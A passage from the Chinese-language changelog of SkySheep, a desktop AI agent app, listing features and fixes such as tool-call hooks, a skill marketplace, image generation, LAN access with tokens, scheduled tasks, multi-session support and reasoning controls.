  打字机）；`securityLevel: "strict"` 防注入，主题随亮暗切换，语法错误退回代码展示。
  主对话、历史渲染、辅助对话三处管线均接入。
- **技能广场**：设置 · 技能新增「🛍 技能广场」——拉取技能索引（支持环境变量
  `SKYSHEEP_MARKET_URL` 指向自建索引；拉不到时回退内置精选：anthropics/skills 的
  docx/pdf/pptx/xlsx 文档技能与全仓库），卡片展示 + 一键安装，复用既有网址安装管道
  （GitHub / Gitee 链接，装完立即生效）。新增 WS 方法 `skills.market`（60 秒缓存）。
- **AI 画图工具 `generate_image`**：接入智谱 CogView / 硅基流动 Kolors / 自定义
  OpenAI 兼容 `/images/generations`；「自动」档复用同名模型服务的 Key（零配置）。
  生成结果下载前做公网校验（复用 web_fetch 的 SSRF 防护），保存到项目内
  `images/`（可指定路径），走 WRITE 权限确认与检查点记录。设置页新增「AI 画图」卡片。
  新增 WS 方法 `imagegen.get` / `imagegen.save`。
- **hooks 系统（工具调用前后用户钩子）**：`config.toml` 配置
  `[[hooks.pre_tool_use]]` / `[[hooks.post_tool_use]]`（match 工具名 glob + command +
  timeout_s）。pre 钩子退出码 2 或 stdout 输出 `{"decision":"block","reason":"..."}` 时
  阻止该工具调用（原因回传模型），其余非零视为钩子自身故障不阻断；post 仅产生
  notice 通知。stdin 收到 `{tool, input, working_dir}` JSON，环境变量带
  `SKYSHEEP_TOOL/SKYSHEEP_PROJECT`。CLI 与桌面端同享；切换项目随工作目录重建。
  Windows 传命令行用字符串形式绕开 `cmd /c` 的 list2cmdline 引号陷阱。
- **更新检查 + 安装包脚本**：启动后台查一次 GitHub Releases（6 秒超时、离线/仓库不存在
  完全静默），发现新版本进通知中心并在 设置 · 关于 展示「🆕 新版本 vX 可用，前往下载」，
  可手动再查（`app.check_update`）。新增 `core/uptodate.py`（版本号数字段比较 +
  Releases API 拉取）。新增 Inno Setup 打包脚本 `tools/installer.iss`（PyInstaller 产物
  → 单文件 setup.exe，输出 `installer/`；构建步骤见脚本头注释）。
- **局域网远程访问**：设置 · 界面与通知新增「局域网访问」卡片。开启后（重启生效）服务
  绑定 `0.0.0.0`，同 Wi-Fi 的手机/平板凭令牌访问——HTTP 中间件与 WS 握手双层校验
  （`?token=` 首访种 cookie / cookie / `X-SkySheep-Token` 头，常数时间比较），403 页
  引导补令牌；面板展示局域网地址 + 二维码（vendor qrcode.js，扫码直达，含令牌警示）。
  令牌自动生成可自定义，写入 `config.toml [server]`；默认关闭保持仅本机监听。
  窄屏（≤860px）基础响应式：侧栏变抽屉（顶栏 ☰ 开关）、右面板悬浮。
- **消息级重生成 / 编辑重发 / 分叉**：任意用户消息悬停出现三个操作。「✎ 编辑」回退到
  该消息并把原文填回输入框（改完直接发）；「↻ 重新生成」删掉这轮回答、保留问题重跑
  （引擎新增 `append_user` 控制，不重复追加用户消息）；「⑂ 分叉」把截至该消息的内容
  复制成一个新会话，原会话不受影响。协议新增 `session.truncate`（mode=regen|edit）
  与 `session.fork`；消息携带 `seq` 供锚定。
- **全局快捷键**：Windows 桌面模式下 `Ctrl+Alt+Space` 唤起 SkySheep 窗口，自动聚焦
  输入框并预填当前剪贴板文本（Win32 API 读剪贴板，不依赖浏览器权限）；热键被占用时
  静默跳过，不影响应用；`--browser` 兜底路径不启用。
- **通知中心**：顶栏新增铃铛入口，聚合错过的提醒——定时任务结果、权限请求、日程提醒、
  运行错误；未读数角标、单条可读、一键清空。
- **模型自动生成会话标题**：新会话首轮结束后，后台用当前模型生成不超过 12 字的标题替换
  首行截断文本（仅首轮触发、失败保持原状、不阻塞主流程）。
- **终端 → Agent**：终端面板新增「→ Agent」按钮，把最近输出（约 2400 字）以引用块带入
  输入框，补充问题即可让 Agent 分析报错。
- **自定义快捷指令**：设置页「快捷指令」管理常用提示词模板，输入 `/` 时置顶展示、选中即
  插入；内容里的 `{{clipboard}}` 自动替换为剪贴板文本。
- **文件树标签**：右面板新增「文件」标签，工作区目录树浏览 + 点击预览（只读）；新增
  `fs.read` 协议，沙箱限制在工作目录内、跳过二进制、超大文件截断提示。
- **用量统计**：每轮对话的输入/输出 tokens 落库（`usage_log` 表），设置页「用量」展示近
  14 天按天柱状、按会话排行与合计；在服务编辑页填「每百万 tokens 单价」后额外估算费用。
- **子代理任务面板**：右面板新增「任务」标签，列出 Agent 拆解出的后台子任务（状态 / 指令 /
  结果），支持刷新与一键全部取消，面板打开时每 3 秒轻量轮询。
- **A/B 模型对比**：圆桌成员面板新增「对比模式」——开启后不融合，各成员回答作为带归属
  徽标的独立消息保留，便于对照；复用现有圆桌调度与成员选择。
- **对话区宠物「云朵小羊」**：聊天流右下角常驻一只小羊——待机时轻轻浮动、偶尔冒泡；
  Agent 运行时快速蹦跶，等待权限确认时摇晃提醒（60% 概率冒泡「等你拍板呢」），
  一轮跑完做一次庆祝跳；点它会挤脸并随机搭话。**可拖动 + 云朵重力**：按住小羊在
  对话区内任意移动，松手后以「云朵的方式」缓缓飘落——加速度小、终端速度低、
  带正弦摇曳，落到底部 Q 弹软着陆（下落途中还能一把抓住重新拖）；**地面自适应**：
  拖动输入栏高度等改变对话区尺寸时，地面升高会把小羊托上去、地面降低会让它
  再飘落一次补位（ResizeObserver 监听）。横向落点经 ui.json `pet_x` 记住、重启恢复
  （纵向有重力，总是落在底部），双击回到默认右下角。可在「设置 · 界面与通知 →
  对话区宠物」关闭（`pet` 键，默认显示）。
- **思考强度可调**：顶栏模型徽章旁新增「思考」档位控件（自动 / 低 / 中 / 高），
  一键切换模型的推理投入并立即对下一轮生效。各厂商映射到原生参数：OpenAI 兼容线
  透传 `reasoning_effort`，Anthropic 映射为扩展思考预算 `thinking.budget_tokens`
  （低 4k / 中 10k / 高 24k）；「自动」不传参数，沿用服务默认行为。
  控件默认为**所有服务可用**（含自定义服务）：「自动」档不发送任何参数，因此对
  不认识推理参数的服务也无副作用；若某服务确实不支持，可在
  「设置 · 模型服务 → 该服务 → 提供思考强度调节」关掉，控件随之为该服务隐藏。
  档位按服务存入 config.toml（`reasoning_effort`）。协议新增
  `model.reasoning` / `model.set_reasoning`；服务详情接口回传
  `supports_reasoning` / `reasoning_effort`。
- **多会话并行**：主对话区支持多个会话标签同时运行——每个会话独立的 Agent 实例、
  消息队列与文件改动记录器，互不占用；事件带 `session_id` 路由到对应标签，后台标签
  继续接收流式输出、权限确认标到标签徽标上（切过去再展示）；侧栏/搜索点开会话直接
  开标签并渲染历史（此前恢复历史会话只加载进引擎、前端一片空白，本次一并修复）。
  后端 `ServerBackend` 引入 `SessionRuntime`（sid → agent/queue/run_task/recorder），
  `chat.send`/`stop` 支持 `session_id`，新增 `session.activate` 轻量切换活动会话；
  取消语义统一：用户停止某会话后任务返回诚实的 `stopped` 结果并释放运行位，
  落库用 `asyncio.shield` 保护避免中断丢消息。前端标签条在单标签时自动隐藏。
- **定时任务**：侧栏「定时任务」入口做实（此前为「即将上线」）。支持每隔 N 分钟 /
  每天定时 / 每周定时三种调度；每个任务独立会话、历史随运行累积；创建时可选预授权
  工具（write_file / run_command 等），未预授权的写与高危操作**自动拒绝**（headless
  门控 CronGate，只读操作照常放行），任务结果（最后一条助手回答摘要 / 错误）写回
  任务行并在面板与系统通知里可见；`cron.run_now` 支持手动立即运行。新增
  `cron_tasks` 表与 `cron.list/add/update/delete/run_now` 协议；调度循环每 20 秒
  扫描，应用关闭期间到期的任务在下次启动补跑。
- **图片输入（多模态）**：输入框支持粘贴 / 拖拽图片（PNG/JPG/WebP/GIF，单条最多 4 张、
  单张 ≤ 4MB），发送前缩略图预览可移除；消息模型新增 `ImageBlock`（base64，不入文本），
  openai_compat 转 `image_url` content parts、anthropic 转 `image` source block，
  历史随消息持久化；纯图片消息（无文字）也能发，会话标题兕底为「[图片]」。
- **Windows 系统通知**：窗口失焦时任务完成、Agent 等待确认会弹系统 toast（winotify），
  前台使用不打扰；后台会话的确认请求同样通知。新增 `app.notify` 协议与 ui.json 开关
  （设置 · 界面与通知）；定时任务结果无论前台后台都会通知（可关闭）。
- **写入前 diff 预览**：权限确认条对 `write_file` / `edit_file` 展示改前→改后的
  unified diff（工作目录内文本文件，超出 160 行截断），确认时看到真实改动而不是
  猜测 JSON 参数；`PermissionRequest` 事件新增 `diff` 字段，越权/二进制等场景静默降级。
- **检查点回滚入口补齐**：右面板「回顾」的历史轮次新增「↩ 恢复」入口（两击确认），
  可恢复到任意一轮改动前的文件状态，不再只能回滚当前轮。
- **会话摘要与搜索高亮**：会话列表每条显示最近一条助手回答开头（120 字内）作为进展
  摘要（`sessions.summary` 列，旧库自动迁移）；跨会话搜索的命中片段高亮标出，
  一目了然定位命中位置。

- **圆桌（多模型共同思考）**：输入框新增「◇ 圆桌」一次性开关（发送后自动复位）与成员选择
  浮层（▾，数据来自已配置 Key 的服务，选择存 localStorage，不选则自动挑选）。开启后本条
  消息走「N 个模型并行独立作答（无工具、纯思考）→ 主席（当前主模型）融合成一份更好的最终
  回答」流程：成员草稿在对话流的圆桌卡片内并列流式展示（可折叠，失败成员标 ✗ 不阻断整场），
  融合答案作为本轮正式助手消息入历史与存储（气泡带「◆ 圆桌融合」徽标，元数据随消息持久化，
  重开会话可辨）；主历史只保留「问题 + 融合答案」，草稿不入主历史，后续追问上下文干净。
  - 引擎：新增 `core/roundtable.py`（成员并行作答/主席融合编排，复用瞬态错误重试节奏，
    单成员超时与失败均被容纳）；`events.py` 新增 `RoundtableStarted / RoundtableMemberDelta /
    RoundtableMemberFinished` 三个事件；`Message` 新增 `roundtable` 元数据字段（存储零改动）；
    `config.toml` 新增 `[roundtable]` 段（`max_members` / `member_timeout_s` / `chair_answers`）。
  - 协议：`chat.send` 新增 `roundtable` / `members` 参数，成员解析在后端完成
    （显式列表优先，去重、上限截断、缺 Key 服务跳过，构建失败降级为错误卡片）。
  - 全程不传工具表、不经 PermissionGate，无新增安全面；token 成本约 (N+1) 倍。
  - 测试：新增 `tests/test_roundtable.py`（事件序列与融合输入、单成员失败/超时容错、
    瞬态重试、融合部分文本保留、成员解析真实构建路径、WS 端到端与持久化、普通发送回归），
    全量 144 绿。
- **界面缩放（整体字号/内容大小可调）**：整个页面内容按百分比缩放，字体随内容一起变。
  侧栏底部新增「界面 −/+」步进控件（步长 10%，范围 70–120%），当前百分比实时显示；
  偏好经 `ui.get`/`ui.save` 存入 ui.json（新增 `ui_scale` 键，后端按 70–120 收敛），
  重启后恢复。默认 90%（略小于标准大小）。实现上用 CSS `zoom` 打在 `#app` 与 body 级浮层
  （会话菜单/模型菜单/标签菜单/弹窗/到点提醒）上，`#app` 高度直接用 100%
  （标准化 zoom 会自动归一百分比高度，实测不能再手动除以 zoom，否则超高把底部内容顶出视口）；
  依赖视口坐标的会话菜单、模型菜单、标签菜单定位与侧栏/输入区/右面板拖拽计算均已适配
  物理像素到缩放布局坐标的换算。

### 变更

- **内置模型服务预设更新默认模型**：各内置服务的出厂默认模型刷新为当前主流常见版本——
  智谱 `glm-4.6` → `glm-5.3`；Moonshot `kimi-k2-0905-preview` → `kimi-k3`；
  OpenRouter `anthropic/claude-sonnet-4.5` → `anthropic/claude-opus-5`；
  硅基流动 `Qwen/Qwen3-32B` → `deepseek-ai/DeepSeek-V3.2`；
  Anthropic 原生 `claude-sonnet-4-5` → `claude-opus-5`（官方当前推荐主力）。
  DeepSeek（`deepseek-chat`）与 Ollama（`qwen3:8b`）维持不变；所有服务名、base_url、
  环境变量与删除/恢复逻辑均无变化。已写入本机 `config.toml` 的用户配置不受影响，
  仅影响新配置的初始值；设置页各服务详情里仍可点「从供应商获取」拉取全部可用模型切换。
  设置页手动填模型与自定义服务的示例占位符同步更新（gpt-4o → glm-5.3 / deepseek-chat）。
- **「恢复内置服务」改为按最新出厂预设重建**：隐藏内置服务时旧的 `[providers.<name>]`
  段仍留在 config.toml 里，原样恢复会让历史快照（如旧默认模型名）覆盖升级后的预设。
  现在恢复时按当前 PRESETS 重建 kind/base_url/env_key/model（anthropic 无 base_url
  时不写入），仅保留已配置的 api_key；停用的自定义服务重新启用仍原样保留全部字段。
  设置页删除确认、恢复提示与隐藏区说明同步更新。

### 修复

- **托盘图标右键菜单重写为原生 Win32 实现**：右键托盘小羊弹「打开 SkySheep / 退出 SkySheep」
  菜单。原先用 WinForms `NotifyIcon` + `ContextMenuStrip`，在 pywebview 的消息泵下点击
  事件不可靠（右键菜单弹不出，自动弹出与手动 `Show()` 两种方式实测均失败）；现改为
  `Shell_NotifyIcon` + 独立托盘线程（自建回调窗口与消息循环）+ `TrackPopupMenu`
  的正统写法，鼠标事件直达 `WndProc`，不依赖 .NET 事件层与 pywebview 的消息循环。
  左键/双击恢复窗口（纯 Win32 置前，不再经 pywebview）；「退出」置退出标志后向主窗口
  发 `WM_CLOSE`，关闭事件回到 GUI 线程且不再弹退出选择框；缩托盘气泡改用 `NIM_MODIFY`
  原生通知。托盘线程全程带日志（`desktop.log`），不可用时不阻塞主流程；启动器
  `SkySheep.pyw` 对加载阶段失败增加弹窗上报，不再静默“打不开”（初版原生实现曾因
  `wintypes.LRESULT` 不存在在 import 时崩溃）。

## [0.6.0] - 2026-09-15

### 新增

- **日程功能（侧栏「日程」入口做实）**：跨会话持久化的用户级日程，切项目不丢。
  - **Agent 工具 `schedule_write`**：add / list / update / delete 四个动作，READONLY 免确认；
    对话里说「帮我记一下明天下午3点开会」即可写入日程。日程变化经 `ScheduleUpdated`
    事件推到前端（与 `todo_write → TodoUpdated` 同款机制）；系统提示词新增第 8 条指引
    （相对时间先换算 Unix 时间戳，拿不准先向用户确认）。
  - **到点提醒**：服务端后台循环（20s 间隔）扫描到期未提醒日程，向所有在线连接广播
    `schedule_reminder`；前端弹出横幅（完成 / 稍后提醒 10 分钟 / 关闭），提前提醒触达时
    横幅显示剩余分钟数。应用关闭期间的到期日程在下次启动首轮扫描时补提醒。
    改期自动重置已提醒标记。日程支持 **提前量 `remind_before`**（分钟，0 = 到点才提醒）：
    弹窗下拉选到点 / 5 / 10 / 15 / 30 分钟 / 1 小时，旧库自动迁移补列。
  - **侧栏日程面板**：按 过期 / 今天 / 明天 / 未来 分组列表，行尾悬浮 ✓ 完成、✕ 删除，
    点击进编辑弹窗（标题 / 时间 / 备注 / 提醒开关）；「＋」新增。日程增删改通过
    `schedule.list / add / update / delete` WS 方法完成，多窗口经 `schedule_updated` 事件同步。
  - 存储：全局库 `~/.skysheep/skysheep.db` 新增 `schedules` 表；CLI 与桌面端均注册工具。
  - 测试：新增 `tests/test_schedule.py`（存储 CRUD / 工具校验 / WS 往返 / 提醒扫描），全量 134 绿。

### 修复

- `pyproject.toml` 元数据与事实对齐：版本号追平 CHANGELOG（0.1.0 → 0.6.0），
  license 由 Apache-2.0 修正为 LICENSE 文件实际的 MIT。

## [0.5.0] - 2026-09-15

### 新增

- **对话页直接切换模型**：点击顶栏模型徽章弹出菜单，列出所有已启用服务的全部已启用模型
  （当前项打 ✓、行尾服务名徽章、缺 Key 的标 ⚠），点选即热切换并立即生效，不用进设置页；
  菜单底部保留「⚙ 管理模型服务…」入口。Escape / 点击空白处关闭。
- **右侧标签页面板（对话右侧直接展开）**：顶栏新增面板开关按钮，点击即在对话右侧
  展开/收起面板（不弹任何窗口）；标签条行尾「＋」唤出小菜单选择要打开的标签：
  - **终端**：在当前项目目录执行命令，输出实时流式回显（stdout/stderr 分色、
    按本机编码解码中文），「停止」结束整个进程树，↑↓ 翻命令历史；
  - **浏览器**：地址栏 + iframe 预览（本地开发服务器/可内嵌网页），自动补全 http://；
  - **辅助对话**：独立于主会话的轻量问答（流式、不落库、不带工具、独立记忆，可清空）；
  - **审查**：按轮列出本会话 Agent 改过的文件，点击查看「改前 → 现在」的
    unified diff（新建/修改/删除/二进制分状态标注）。
  面板宽度可拖拽调整（240–720px）、双击复位；打开了哪些标签、激活哪个、是否收起
  全部持久化到 `~/.skysheep/ui.json`，重启自动恢复。关最后一个标签自动收起面板；
  关终端标签会顺手结束还在跑的命令。新增 WS 方法 `term.run` / `term.stop` /
  `chat.aux` / `aux.clear` / `checkpoint.diff`。

### 修复

- **消息排队竞态**：`send()` 的运行标志此前在懒创建会话之后才设置，两条消息背靠背
  到达时会在 `new_session()` 的挂起点上双双判为空闲、并发执行并撞消息表唯一约束；
  现改为任何 await 之前先占住运行位（pipeline 启动即失败时也会让出该位，避免队列卡死）。

## [0.4.1] - 2026-09-15

### 新增

- **窗口标题栏主题化**：系统标题栏（最上方控制窗口的那一行）通过 DWM 属性染成
  纸墨主题——底色纸色 #E8DFC7、文字/边框墨色 #1D1A16、浅色模式（深色窗口按钮
  字形），与界面融为一体。Win11 生效，老系统自动跳过保持系统默认。
  新增 `skysheep/wintheme.py`，双击启动（desktop.py）与 `skysheep app`
  （cli/app.py）两条路径都接入。
- **手动调整区域大小**：拖动侧栏右缘调整侧栏宽度（200–460px）、拖动输入区上缘调整输入区高度
  （74–520px，向上拖变高）；悬停手柄亮出蓝线，双击手柄恢复默认。布局偏好保存到
  `~/.skysheep/ui.json`、重启后自动恢复（pywebview 私密模式下前端存储不持久，故存后端）。
  新增 WS 方法 `ui.get` / `ui.save`。
- **删除项目**：侧栏项目列表非当前行悬浮出 ✕，确认后从列表移除该项目，它的会话（含置顶）、
  消息与白名单规则一并删除；电脑上的文件夹不受影响，可随时重新添加。正在使用的项目
  需先切换出去再删。新增 WS 方法 `project.delete`。
- **侧栏项目列表（对标 Obsidian 项目列表布局）**：「项目」分组直接以文件夹行列出全部项目，
  当前项目高亮；点击任意项目即切换工作目录，行尾「＋」打开添加/切换弹窗
  （历史项目、选文件夹、粘贴路径）。原「项目」分组下的会话列表独立为「会话」分组，
  仍只显示当前项目的会话。
- **应用内设定/切换工作项目**：任务运行中拒绝切换；切换内容：工作目录、项目记录与白名单、
  项目技能、项目级 MCP、AGENTS.md 项目记忆、子代理工作目录，并接上该项目最近的会话；
  模型服务等全局配置不受影响。同目录重复切换幂等跳过。新 WS 方法 `project.switch`。
- 桌面原生选择器 `FilePicker` 新增 `dir` 类型（任意文件夹）。

### 变更

- 侧栏导航移除「工作项目」项（功能并入「项目」分组：列表点击切换 + ＋ 弹窗）。
- **界面整体间距收紧（约 25–35%）**：侧栏、顶栏、聊天流、输入区、设置页的内外边距与
  分区间距全部缩小（如聊天区 20×26→14×18、消息间距 14→10、输入区 12×18→8×14），
  同屏可见内容更多；拖拽调宽/调高、双击复位等功能不受影响。

## [0.4.0] - 2026-09-15

对标 Claude Code / OpenAI Codex CLI / ZCode 的特性补齐版本。

### 新增

- **Slash 命令菜单**：桌面输入框输入 `/` 唤出命令面板，`/help /new /compact /model /status /todos /export`；新增 WS 方法 `chat.status`（模型/上下文/工具/任务清单一览）与 `chat.compact`（手动上下文压缩）。
- **消息排队**：Agent 工作期间继续发消息不再报错，而是入队并在当前轮结束后自动依次执行；`queue_updated` 事件作为前端运行状态的唯一事实源；运行期间发送按钮变为「排队」。
- **瞬态错误自动重试**：模型调用遇限流（429）/超时/断流等服务端瞬态错误时自动指数退避重试（最多 3 次），通过 `notice` 事件提示；已产出内容时禁止重放，非瞬态错误不重试。
- **web_fetch 联网工具**：抓取公网网页转纯文本（HTML 自动去标签）。安全边界：仅 http(s)、解析 IP 必须公网（防 SSRF）、重定向逐跳复检、响应限 2MB / 输出限长、20s 超时。只读工具，规划模式可用。
- **检查点 / 一键回滚**：`write_file` / `edit_file` 覆盖前自动快照原始内容，每轮结束存为检查点；对话中出现「↩ 撤销本轮改动」按钮，回滚后告知模型上下文。新增 WS 方法 `checkpoint.list` / `checkpoint.restore`。run_command 造成的改动不在追踪范围；检查点保存在内存（重启过期）。
- **@ 文件提及**：输入 `@` 弹出项目文件索引补全（跳过依赖/构建目录，上限 400 项，30s 缓存）；新增 WS 方法 `fs.files`。
- **会话搜索**：侧栏搜索框跨会话检索标题与消息全文，结果带命中片段预览，点击直达；新增 WS 方法 `session.search` 与存储层 `search_messages`。
- CLI 渲染器支持 `notice` 事件（弱化黄色提示）。

### 变更

- 内置工具从 8 个增至 9 个（+`web_fetch`）。
- `default_tools(recorder=...)` 接受可选 ChangeRecorder 以启用检查点；CLI 用法不变。
- `Provider.stream` 瞬态错误分类器 `is_transient_error` 导出自 `core.agent`。
- 版本号 0.1.0 → 0.4.0；README 增加与主流 Agent 的特性矩阵。

### 修复

- 消息排队的持久化时序：上一轮落库完成后才交棒下一轮，避免 `messages(session_id, seq)` 唯一约束冲突。
- 搜索结果展示期间被轮次结束的会话列表刷新覆盖（侧栏搜索态守卫）。

## [0.1.0] - 2026-09-14

- M1 引擎内核：Agent 循环、双协议 Provider、内置工具、权限门、SQLite 持久化
- M2 扩展生态：MCP 客户端、Skills、子代理、上下文压缩
- M3 桌面应用：pywebview + FastAPI/WebSocket + 零构建前端、设置页、会话管理、
  技能/MCP 程序内导入（网址安装 + 模板）、多模型管理、纸墨主题
- M3.5：AGENTS.md 注入、todo 面板、规划模式、diff 视图、会话导出、
  桌面双击启动器（无终端）、启动动画、思考型模型 reasoning 回传
